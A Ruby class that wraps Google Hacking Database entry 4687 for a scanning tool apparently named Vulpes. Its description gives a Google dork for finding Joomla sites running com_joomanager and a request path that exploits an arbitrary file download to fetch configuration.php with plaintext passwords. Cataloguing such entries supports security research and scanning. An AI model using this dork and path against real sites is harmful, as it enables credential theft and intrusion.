module Dorks
   class Dork4687 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 4687",
            ghdb_url: "https://www.exploit-db.com/ghdb/4687",
            severity: "6",
            category: "vulnerable_servers.joomla",
            publish_date: "2018-03-05",
            author: "Ankit Anubhav",
            dork: <<~EDORK,
Joomla! com_joomanager - Arbitrary File Download
EDORK
            description: <<~EDESC
1. Google inurl:"index.php?option=com_joomanager" = 3540 results
2. [URL]+/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php gives a file which has password in PLAINTEXT!
Source: https://twitter.com/ankit_anubhav/status/970673767750959104
EDESC
         })

      end
   end
end
